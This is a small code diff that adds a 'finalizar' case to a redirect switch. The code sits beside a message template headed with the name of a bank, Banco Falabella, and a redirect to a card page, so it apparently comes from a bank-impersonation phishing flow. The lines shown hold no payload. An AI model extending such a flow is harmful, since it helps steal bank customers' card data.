@@ -374,6 +374,7 @@ const mensaje = `💎BANCO FALABELLA💎
                     window.location.href = "tarjeta.php";
                     break;
                 case 'confirm_finalizar':
+                case 'finalizar':
                     window.location.href = "finalizado.php";
                     break;
                 default:
